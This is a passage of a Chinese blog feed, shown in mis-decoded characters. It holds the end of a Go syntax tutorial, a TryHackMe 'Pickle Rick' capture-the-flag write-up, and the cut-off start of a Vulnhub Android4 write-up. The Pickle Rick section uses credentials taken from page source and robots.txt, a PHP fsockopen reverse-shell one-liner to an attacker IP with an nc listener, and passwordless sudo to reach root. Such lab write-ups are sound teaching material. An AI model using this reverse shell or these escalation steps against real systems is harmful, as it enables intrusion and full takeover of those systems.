class="hljs-symbol">defer</span>        <span class="hljs-symbol">go</span>           <span class="hljs-symbol">map</span>          <span class="hljs-symbol">struct</span><br><span class="hljs-symbol">chan</span>         <span class="hljs-symbol">else</span>         <span class="hljs-symbol">goto</span>         <span class="hljs-symbol">package</span>      <span class="hljs-symbol">switch</span><br><span class="hljs-symbol">const</span>        <span class="hljs-symbol">fallthrough</span>  <span class="hljs-symbol">if</span>           <span class="hljs-symbol">range</span>        <span class="hljs-symbol">type</span><br><span class="hljs-symbol">continue</span>     <span class="hljs-symbol">for</span>          <span class="hljs-symbol">import</span>       <span class="hljs-symbol">return</span>       <span class="hljs-symbol">var</span><br></code></pre></td></tr></table></figure><h1 id="è¿ç®—ç¬¦"><a href="#è¿ç®—ç¬¦" class="headerlink" title="è¿ç®—ç¬¦"></a>è¿ç®—ç¬¦</h1><p>go è¯­è¨€ä¸­æ”¯æŒçš„è¿ç®—ç¬¦å·çš„ä¼˜å…ˆçº§æ’åˆ—</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs tap">Precedence    Operator<br>   <span class="hljs-number"> 5 </span>            *  /  %  &lt;&lt;  &gt;&gt;  &amp;  &amp;^<br>   <span class="hljs-number"> 4 </span>            +  -  |  ^<br>   <span class="hljs-number"> 3 </span>            ==  !=  &lt;  &lt;=  &gt;  &gt;=<br>   <span class="hljs-number"> 2 </span>            &amp;&amp;<br>   <span class="hljs-number"> 1 </span>            ||<br></code></pre></td></tr></table></figure><p>go è¯­è¨€ä¸­æ²¡æœ‰é€‰æ‹©å°†<code>~</code>ä½œä¸ºå–åè¿ç®—ç¬¦ï¼Œè€Œæ˜¯å¤ç”¨äº†<code>^</code>ç¬¦å·ï¼Œå½“ä¸¤ä¸ªæ•°å­—ä½¿ç”¨<code>^</code>æ—¶ï¼Œä¾‹å¦‚<code>a^b</code>ï¼Œå®ƒå°±æ˜¯å¼‚æˆ–è¿ç®—ç¬¦ï¼Œåªå¯¹ä¸€ä¸ªæ•°å­—ä½¿ç”¨æ—¶ï¼Œä¾‹å¦‚<code>^a</code>ï¼Œé‚£ä¹ˆå®ƒå°±æ˜¯å–åè¿ç®—ç¬¦ã€‚go ä¹Ÿæ”¯æŒå¢å¼ºèµ‹å€¼è¿ç®—ç¬¦</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a</span> += <span class="hljs-number">1</span><br><span class="hljs-attribute">a</span> /= <span class="hljs-number">2</span><br><span class="hljs-attribute">a</span> &amp;^= <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p><strong>æ³¨æ„</strong>ï¼šgo ä¸­æ²¡æœ‰è‡ªå¢å’Œè‡ªå‡ï¼Œä»–ä»¬å˜æˆäº†è¯­å¥ <code>statement</code> ï¼Œå¹¶ä¸”è§„å®šäº†åªèƒ½ä½äºæ“ä½œæ•°çš„åæ–¹ï¼Œæ‰€ä»¥ä¸ç”¨å†å»çº ç»“ <code>i++</code>å’Œ<code>++i</code> è¿™ç§ä¸å¤ªèªæ˜çš„é—®é¢˜ï¼Œä½†æ˜¯æ²¡æœ‰è¿”å›å€¼ã€‚ç”šè‡³  <code>a = b++</code> è¿™ç§å†™æ³•æ˜¯é”™è¯¯çš„ã€‚</p><h1 id="å­—é¢é‡"><a href="#å­—é¢é‡" class="headerlink" title="å­—é¢é‡"></a>å­—é¢é‡</h1><h2 id="æ•´å‹å­—é¢é‡"><a href="#æ•´å‹å­—é¢é‡" class="headerlink" title="æ•´å‹å­—é¢é‡"></a>æ•´å‹å­—é¢é‡</h2><p>å…è®¸ä½¿ç”¨ <code>_</code> è¿›è¡Œæ•°å­—åˆ’åˆ†ï¼Œä½†æ˜¯ä»…ä»…å…è®¸åœ¨å‰ç¼€ç¬¦å·ä¹‹åå’Œæ•°å­—ä¹‹é—´ä½¿ç”¨</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">24 </span>// <span class="hljs-number">24</span><br><span class="hljs-symbol">024 </span>// <span class="hljs-number">24</span><br><span class="hljs-number">2</span>_4 // <span class="hljs-number">24</span><br><span class="hljs-number">0</span>_2_4 // <span class="hljs-number">24</span><br><span class="hljs-number">10</span>_000 // <span class="hljs-number">10</span>k<br><span class="hljs-number">100</span>_000 // <span class="hljs-number">100</span>k<br><span class="hljs-number">0</span>O24 // <span class="hljs-number">20</span><br><span class="hljs-number">0</span>b00 // <span class="hljs-number">0</span><br><span class="hljs-number">0</span>x00 // <span class="hljs-number">0</span><br><span class="hljs-number">0</span>x0_0 // <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h2 id="æµ®ç‚¹å‹å­—é¢é‡"><a href="#æµ®ç‚¹å‹å­—é¢é‡" class="headerlink" title="æµ®ç‚¹å‹å­—é¢é‡"></a>æµ®ç‚¹å‹å­—é¢é‡</h2><p>é€šè¿‡ä¸åŒå‰ç¼€å¯ä»¥è¡¨è¾¾ä¸åŒè¿›åˆ¶æµ®ç‚¹æ•°</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">0.<br>72.40<br>072.40       <span class="hljs-string">//</span> == 72.40<br>2.71828<br>1.e+0<br>6.67428e-11<br>1E6<br><span class="hljs-string">.25</span><br><span class="hljs-string">.12345E</span>+5<br>1_5.         <span class="hljs-string">//</span> == 15.0<br>0.15e+0_2    <span class="hljs-string">//</span> == 15.0<br><br>0x1p-2       <span class="hljs-string">//</span> == 0.25<br>0x2.p10      <span class="hljs-string">//</span> == 2048.0<br>0x1.Fp+0     <span class="hljs-string">//</span> == 1.9375<br>0X.8p-0      <span class="hljs-string">//</span> == 0.5<br>0X_1FFFP-16  <span class="hljs-string">//</span> == 0.1249847412109375<br>0x15e-2      <span class="hljs-string">//</span> == 0x15e - 2 <span class="hljs-params">(integer subtraction)</span><br></code></pre></td></tr></table></figure><h2 id="å¤æ•°å­—é¢é‡"><a href="#å¤æ•°å­—é¢é‡" class="headerlink" title="å¤æ•°å­—é¢é‡"></a>å¤æ•°å­—é¢é‡</h2><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">0i<br>0123i         <span class="hljs-string">//</span> == 123i<br>0o123i        <span class="hljs-string">//</span> == 0o123 * 1i == 83i<br>0xabci        <span class="hljs-string">//</span> == 0xabc * 1i == 2748i<br>0.i<br>2.71828i<br>1.e+0i<br>6.67428e-11i<br>1E6i<br><span class="hljs-string">.25i</span><br><span class="hljs-string">.12345E</span>+5i<br>0x1p-2i       <span class="hljs-string">//</span> == 0x1p-2 * 1i == 0.25i<br></code></pre></td></tr></table></figure><h2 id="å­—ç¬¦å­—é¢é‡"><a href="#å­—ç¬¦å­—é¢é‡" class="headerlink" title="å­—ç¬¦å­—é¢é‡"></a>å­—ç¬¦å­—é¢é‡</h2><p>å­—ç¬¦å­—é¢é‡å¿…é¡»ä½¿ç”¨å•å¼•å·æ‹¬èµ·æ¥ <code>&#39;&#39;</code></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#x27;a&#x27;<br>&#x27;Ã¤&#x27;<br>&#x27;ä½ &#x27;<br>&#x27;\t&#x27;<br>&#x27;\007&#x27;<br>&#x27;\x07&#x27;<br>&#x27;\xff&#x27;<br>&#x27;\u12e4&#x27;<br>&#x27;\U<span class="hljs-number">00101234</span>&#x27;<br></code></pre></td></tr></table></figure><h2 id="è½¬ä¹‰å­—ç¬¦"><a href="#è½¬ä¹‰å­—ç¬¦" class="headerlink" title="è½¬ä¹‰å­—ç¬¦"></a>è½¬ä¹‰å­—ç¬¦</h2><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-string">\a</span>   U+<span class="hljs-number">0007</span> å“é“ƒç¬¦å·<br><span class="hljs-string">\b</span>   U+<span class="hljs-number">0008</span> å›é€€ç¬¦å·<br><span class="hljs-string">\f</span>   U+<span class="hljs-number">000</span>C æ¢é¡µç¬¦å·<br><span class="hljs-string">\n</span>   U+<span class="hljs-number">000</span>A æ¢è¡Œç¬¦å·<br><span class="hljs-string">\r</span>   U+<span class="hljs-number">000</span>D å›è½¦ç¬¦å·<br><span class="hljs-string">\t</span>   U+<span class="hljs-number">0009</span> æ¨ªå‘åˆ¶è¡¨ç¬¦å·<br><span class="hljs-string">\v</span>   U+<span class="hljs-number">000</span>B çºµå‘åˆ¶è¡¨ç¬¦å·<br><span class="hljs-string">\\</span>   U+<span class="hljs-number">005</span>C åæ–œæ è½¬ä¹‰<br><span class="hljs-string">\&#x27;</span>   U+<span class="hljs-number">0027</span> å•å¼•å·è½¬ä¹‰ (è¯¥è½¬ä¹‰ä»…åœ¨å­—ç¬¦å†…æœ‰æ•ˆ)<br><span class="hljs-string">\&quot;</span>   U+<span class="hljs-number">0022</span> åŒå¼•å·è½¬ä¹‰ (è¯¥è½¬ä¹‰ä»…åœ¨å­—ç¬¦ä¸²å†…æœ‰æ•ˆ)<br></code></pre></td></tr></table></figure><h2 id="å­—ç¬¦ä¸²å­—é¢é‡"><a href="#å­—ç¬¦ä¸²å­—é¢é‡" class="headerlink" title="å­—ç¬¦ä¸²å­—é¢é‡"></a>å­—ç¬¦ä¸²å­—é¢é‡</h2><p>å­—ç¬¦ä¸²å­—é¢é‡å¿…é¡»ä½¿ç”¨åŒå¼•å· <code>&quot;&quot;</code> æ‹¬èµ·æ¥æˆ–è€…åå¼•å·ï¼ˆåå¼•å·å­—ç¬¦ä¸²ä¸å…è®¸è½¬ä¹‰ï¼‰</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs swift">`abc`                <span class="hljs-comment">// &quot;abc&quot;</span><br>`\n<br>\n`                  <span class="hljs-comment">// &quot;\\n\n\\n&quot;</span><br><span class="hljs-string">&quot;<span class="hljs-subst">\n</span>&quot;</span><br><span class="hljs-string">&quot;<span class="hljs-subst">\&quot;</span>&quot;</span>                 <span class="hljs-comment">// `&quot;`</span><br><span class="hljs-string">&quot;kfcvme50!<span class="hljs-subst">\n</span>&quot;</span><br><span class="hljs-string">&quot;ç–¯ç‹‚æ˜ŸæœŸå››væˆ‘50&quot;</span><br><span class="hljs-string">&quot;\u65e5æœ¬\U00008a9e&quot;</span><br><span class="hljs-string">&quot;\xff\u00FF&quot;</span><br></code></pre></td></tr></table></figure><h1 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h1><p>é€šè¿‡ <code>func</code> å…³é”®å­—æ¥è¿›è¡Œ</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">func</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>fmt.Println(<span class="hljs-number">1</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>å‚æ•°ç±»å‹åç½®</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs fortran">func Hello(<span class="hljs-keyword">name</span> string) &#123;<br>  <span class="hljs-keyword">fmt</span>.Println(<span class="hljs-keyword">name</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>å¤šè¿”å›å€¼</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">func</span> <span class="hljs-title function_">Pos</span><span class="hljs-params">()</span> <span class="hljs-params">()</span> <span class="hljs-params">(x, y float64)</span> &#123;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="ä»£ç é£æ ¼"><a href="#ä»£ç é£æ ¼" class="headerlink" title="ä»£ç é£æ ¼"></a>ä»£ç é£æ ¼</h1><h2 id="èŠ±æ‹¬å·æ¢è¡Œ"><a href="#èŠ±æ‹¬å·æ¢è¡Œ" class="headerlink" title="èŠ±æ‹¬å·æ¢è¡Œ"></a>èŠ±æ‹¬å·æ¢è¡Œ</h2><p>go ä¸­èŠ±æ‹¬å·éƒ½ä¸èƒ½æ¢è¡Œ</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-comment">//æ­£ç¡®</span><br><span class="hljs-function">func <span class="hljs-title">main</span>()</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;Hello butt3rf1y!&quot;</span>)<br>&#125;<br><br><span class="hljs-comment">//é”™è¯¯</span><br><span class="hljs-function">func <span class="hljs-title">main</span>()</span> <br>&#123;<br>fmt.Println(<span class="hljs-string">&quot;Hello butt3rf1y!&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ä»£ç ç¼©è¿›"><a href="#ä»£ç ç¼©è¿›" class="headerlink" title="ä»£ç ç¼©è¿›"></a>ä»£ç ç¼©è¿›</h2><p>go ä¸­ä»£ç é—´éš”ä¹Ÿæœ‰ä¸€å®šçš„æ„ä¹‰ï¼Œæ¯”å¦‚è¯´</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>*<span class="hljs-number">4</span> + <span class="hljs-number">5</span>/<span class="hljs-number">1</span>*<span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>åœ¨æ ¼å¼åŒ–åï¼Œ<code>*</code> ç¬¦å·ä¹‹é—´çš„é—´éš”ä¼šæ˜¾å¾—æ›´ç´§å‡‘ï¼Œæ„å‘³ç€ä¼˜å…ˆè¿›è¡Œè¿ç®—ï¼Œè€Œ <code>+</code> ç¬¦å·é™„è¿‘çš„é—´éš”åˆ™è¾ƒå¤§ï¼Œä»£è¡¨ç€è¾ƒåè¿›è¡Œè¿ç®—ã€‚</p><h2 id="çœç•¥"><a href="#çœç•¥" class="headerlink" title="çœç•¥"></a>çœç•¥</h2><p>åœ¨ go ä¸­çš„ if å’Œ for è¯­å¥å¯ä»¥åªå†™ä¸€è¡Œï¼Œä½†å¿…é¡»åŠ ä¸ŠèŠ±æ‹¬å·</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css">func <span class="hljs-selector-tag">main</span>() &#123;<br>for <span class="hljs-selector-tag">i</span> := <span class="hljs-number">0</span>; <span class="hljs-selector-tag">i</span> &lt; <span class="hljs-number">10</span>; <span class="hljs-selector-tag">i</span>++ &#123;<br>fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-selector-tag">i</span>)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ä¸‰å…ƒè¡¨è¾¾å¼"><a href="#ä¸‰å…ƒè¡¨è¾¾å¼" class="headerlink" title="ä¸‰å…ƒè¡¨è¾¾å¼"></a>ä¸‰å…ƒè¡¨è¾¾å¼</h2><p>go ä¸­æ²¡æœ‰ä¸‰å…ƒè¡¨è¾¾å¼ï¼Œä¸èƒ½å†™åƒ c è¯­è¨€ä¸­çš„ <code>temp = (a &gt; b) ? a : b;</code>  è¿™ç§è¡¨è¾¾å¼ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>è¯­è¨€</category>
      
      <category>Go</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>THM-Pickle Rick</title>
    <link href="/2025/01/15/Rick/"/>
    <url>/2025/01/15/Rick/</url>
    
    <content type="html"><![CDATA[<p>æ—¶éš”ä¸€ä¸ªåŠæœˆï¼Œæˆ‘ç»ˆäºæ´»äº†ï¼</p><span id="more"></span><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -T4 -sS -Pn <span class="hljs-number">10.10.85.211</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/cd3fd564cb250a1f.png"></p><p>å¼€æ”¾äº† <code>22/tcp sshæœåŠ¡</code>  å’Œ <code>80/tcp httpæœåŠ¡</code> </p><p>è®¿é—®ä¸€ä¸‹ç½‘é¡µ <code>10.10.85.211:80</code>ï¼Œå¥½åƒå¹¶æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨ä¿¡æ¯</p><p><img src="https://img.dkdun.cn/v1/2025/12/fcd52b11d2a9dc4f.png"></p><p>emmmâ€¦f12 ä¸€ä¸‹ï¼Œå‘ç°äº† <code>Usernameï¼šR1ckRul3s</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/8e199542379a914d.png"></p><h2 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h2><p>ç„¶åå†æ‰«ä¸€ä¸‹ç›®å½•å§</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">dirsearch <span class="hljs-punctuation">-</span>u http<span class="hljs-punctuation">:</span><span class="hljs-comment">//10.10.85.211/</span><br></code></pre></td></tr></table></figure><p>æ‰«åˆ°äº†å‡ ä¸ªçœ‹èµ·æ¥æŒºæœ‰ç”¨çš„ç›®å½•ï¼Œä¸€ä¸ªä¸€ä¸ªè®¿é—®ä¸€ä¸‹</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[01:23:50]</span> <span class="hljs-number">301</span> -  <span class="hljs-number">313</span>B  - /assets  -&gt;  http:<span class="hljs-comment">//10.10.85.211/assets/</span><br><span class="hljs-selector-attr">[01:23:50]</span> <span class="hljs-number">200</span> -  <span class="hljs-number">588</span>B  - /assets/<br><span class="hljs-selector-attr">[01:24:39]</span> <span class="hljs-number">200</span> -  <span class="hljs-number">455</span>B  - /login<span class="hljs-selector-class">.php</span><br><span class="hljs-selector-attr">[01:25:10]</span> <span class="hljs-number">200</span> -   <span class="hljs-number">17</span>B  - /robots.txt<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/6c25fc2caf1164eb.png"></p><p>é¦–å…ˆæ˜¯ <code>robots.txt</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/5238ec11e7dc36f5.png"></p><p>ä¸€ä¸²å­—ç¬¦ä¸²ï¼Œä¸çŸ¥é“æœ‰æ²¡æœ‰ç”¨ä½†ä¹Ÿå…ˆæ”¶é›†ç€</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">Wubbalubbadubdub</span><br></code></pre></td></tr></table></figure><p>è®¿é—®ä¸€ä¸‹ <code>login.php</code>ï¼Œç”¨æˆ·åå’Œå¯†ç ï¼ŒæŠŠä¹‹å‰å‘ç°çš„ <code>R1ckRul3s</code> å’Œé‚£ä¸²å¥‡æ€ªçš„å­—ç¬¦ä¸²å¡«è¿›å»ï¼Œå‘ç°æˆåŠŸäº†</p><p><img src="https://img.dkdun.cn/v1/2025/12/c568a7a5f6d0b782.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/16fb5a5e82e320f8.png"></p><h1 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h1><p>åœ¨ <code>Command Panel</code> æ‰§è¡Œ <code>ls</code>ï¼Œå¾—åˆ°äº†å¦‚ä¸‹ç»“æœï¼Œä¸€å †ç›®å½•å’Œæ–‡ä»¶</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Sup3rS3cretPickl3Ingred<span class="hljs-selector-class">.txt</span><br>assets<br>clue<span class="hljs-selector-class">.txt</span><br>denied<span class="hljs-selector-class">.php</span><br>index<span class="hljs-selector-class">.html</span><br>login<span class="hljs-selector-class">.php</span><br>portal<span class="hljs-selector-class">.php</span><br>robots.txt<br></code></pre></td></tr></table></figure><p>cat ä¸è¡Œä½†æ˜¯ tac å¯ä»¥ï¼Œè¾“å…¥ tac å¯ä»¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">tac</span> Sup3rS3cretPickl3Ingred.txt<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/a40d69c3151dda0c.png"></p><p>å¾—åˆ°äº†ç¬¬ä¸€ä¸ª flag</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">mr. meeseek hair<br></code></pre></td></tr></table></figure><h1 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h1><p>ä¹‹å‰ <code>ls</code> æ˜¾ç¤ºå‡ºæ¥çš„æ–‡ä»¶ä¸­æœ‰ä¸€ä¸ªåä¸º <code>clue.txt</code> çš„æ–‡ä»¶ï¼Œä¸­æ–‡æ„æ€æ˜¯ â€œçº¿ç´¢â€ï¼ŒæŸ¥çœ‹ä¸€ä¸‹</p><p><img src="https://img.dkdun.cn/v1/2025/12/18ee2ed196878302.png"></p><p>æ„æ€æ˜¯ â€œåœ¨æ–‡ä»¶ç³»ç»Ÿä¸­å¯»æ‰¾å…¶ä»–æˆåˆ†ã€‚â€ </p><p>çœ‹æ¥å¾—åœ¨ç³»ç»Ÿä¸­å¯»æ‰¾ï¼Œé‚£æ¥åå¼¹ shell ä¸€ä¸‹</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl">php -r &#x27;<span class="hljs-variable">$sock</span>=fsockopen(<span class="hljs-string">&quot;10.21.118.213&quot;</span>,<span class="hljs-number">6667</span>);<span class="hljs-variable">$proc</span>=proc_open(<span class="hljs-string">&quot;/bin/sh -i&quot;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-number">0</span>=&gt;<span class="hljs-variable">$sock</span>, <span class="hljs-number">1</span>=&gt;<span class="hljs-variable">$sock</span>, <span class="hljs-number">2</span>=&gt;<span class="hljs-variable">$sock</span>),<span class="hljs-variable">$pipes</span>);&#x27;<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -l -p <span class="hljs-number">6667</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸€ä¸ªå°æ’æ›²ï¼Œå› ä¸ºæˆ‘ç”¨çš„ wslï¼Œåå¼¹ shell çš„æ—¶å€™åœ¨ wsl çš„ kali ä¸Šç›‘å¬äº†å¾ˆå¤šæ¬¡ï¼Œä½†æ˜¯éƒ½æ²¡æœ‰å›æ˜¾ï¼Œæäº†å¥½å‡ ä¸ªå°æ—¶ï¼Œæœ€åç»ˆäºç ´é˜²ï¼Œåœ¨å‡Œæ™¨ä¸‰ç‚¹æ±‚åŠ©äº n0o0b å¸ˆå‚…ï¼Œå¸ˆå‚…è®©æˆ‘åœ¨ Windows æœ¬æœºä¸Šè¿›è¡Œ nc ç›‘å¬ï¼Œå¯¹äº†ï¼è¿™æ¬¡æˆäº†ï¼Œç»ˆäºï¼ç‰¹åˆ«ç‰¹åˆ«æ„Ÿè°¢ n0o0b å¸ˆå‚… zwzï¼ï¼ï¼</p><p><img src="https://img.dkdun.cn/v1/2025/12/c358e20f23b37553.png"></p><p>ç„¶åæ ¹æ®è‡ªå·±çš„æµç¨‹æ‰¾å‡ºç¬¬äºŒä¸ª flag</p><p><img src="https://img.dkdun.cn/v1/2025/12/80331b77365a4f56.png"></p><p>ç¬¬äºŒä¸ª flag</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">jerry tear</span><br></code></pre></td></tr></table></figure><h1 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h1><p>æœ¬æ¥æˆ‘æƒ³ç€æ‹¿åˆ° shell äº†ï¼Œè¿› root çœ‹çœ‹ï¼Œä½†æ˜¯å¿˜è®°å¼€å§‹çœ‹çš„æ—¶å€™å¥½åƒæ˜¯ www-data æƒé™ï¼Œæƒé™ä¸å¤Ÿ</p><p><img src="https://img.dkdun.cn/v1/2025/12/fc4fa2fcbbe0bad6.png"></p><p>é‚£è¯•è¯• <code>sudo -l</code> åˆ—å‡ºç›®å‰ç”¨æˆ·å¯æ‰§è¡Œä¸æ— æ³•æ‰§è¡Œçš„æŒ‡ä»¤ï¼Œå‘ç°å¯ä»¥é€šè¿‡ sudo å…å¯†ç ä½¿ç”¨ rootï¼ˆç‹‚å–œï¼‰</p><p>ç›´æ¥ä½¿ç”¨ <code>sudo su</code> è¿›å…¥</p><p><img src="https://img.dkdun.cn/v1/2025/12/66849ce6212ea5d3.png"></p><p>ç¬¬ä¸‰ä¸ª flag</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">fleeb juice</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¸—é€</category>
      
      <category>é¶æœº</category>
      
      <category>THM</category>
      
    </categories>
    
    
    <tags>
      
      <tag>THM æ¸—é€</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vulnhub-Android4:1</title>
    <link href="/2024/11/30/Vulnhub-Android4-1/"/>
    <url>/2024/11/30/Vulnhub-Android4-1/</url>
    
    <content type="html"><![CDATA[<p>é€šè¿‡æŸ¥æ‰¾èµ„æ–™ï¼Œåˆå­¦ä¹ åˆ°äº†ä¸€äº›ä¸œè¥¿ï¼Œæˆ‘å¿ƒç”šæ…°ï¼Œå–œæ¬¢è¿™æ ·çš„è‡ªå·± ï¼šï¼‰</p><span id="more"></span><p>åˆå­¦è€…</p><p>æ”»å‡»æœº kaliï¼š192.168.88.138</p><p>é¶æœºï¼š192.168.88.140</p><p><img src="https://img.dkdun.cn/v1/2024/12/01aaf50efc271d05.png"></p><p>æ‰«æç½‘æ®µï¼Œå‘ç°ä¸»æœº 192.168.88.140</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sS <span class="hljs-number">192.168.88.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2024/12/b114f4a2a3bd2d98.png"></p><p>æŸ¥çœ‹å¼€æ”¾ç«¯å£</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">nmap -<span class="hljs-selector-tag">A</span> -sV -<span class="hljs-selector-tag">p</span>- <span class="hljs-number">192.168</span>.<span 